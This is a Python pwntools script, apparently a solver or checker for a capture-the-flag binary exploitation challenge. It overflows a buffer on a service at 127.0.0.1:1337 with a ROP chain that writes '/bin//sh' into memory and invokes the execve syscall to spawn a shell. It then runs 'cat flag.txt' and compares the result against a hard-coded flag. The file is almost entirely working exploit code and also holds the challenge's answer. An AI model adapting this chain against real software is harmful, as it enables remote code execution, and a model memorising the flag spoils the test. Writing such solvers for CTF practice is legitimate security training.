#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib
from pwn import *

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
p=b'A'*14
p += p64(0x0000000000410b63) # pop rsi ; ret
p += p64(0x00000000006b90e0) # @ .data
p += p64(0x00000000004005af) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x000000000047f211) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000410b63) # pop rsi ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x00000000004453e0) # xor rax, rax ; ret
p += p64(0x000000000047f211) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004006a6) # pop rdi ; ret
p += p64(0x00000000006b90e0) # @ .data
p += p64(0x0000000000410b63) # pop rsi ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x000000000044a0a5) # pop rdx ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x00000000004453e0) # xor rax, rax ; ret
p += p64(0x000000000044f100) # mov eax, 8 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x0000000000474551) # add eax, 3 ; ret
p += p64(0x000000000040125c) # syscall

r.sendline(p)
r.recv()
r.sendline("cat flag.txt")
#r.interactive()
print(r.recvuntil(b'ctf{'))
check = (r.recvuntil(b'}'))
if b'H0w_l0nG_w45_uR_L4ss0_m1n3_w45_ju5T_5}' in check:
        print('w')
        exit(0)
else:
        exit(1)
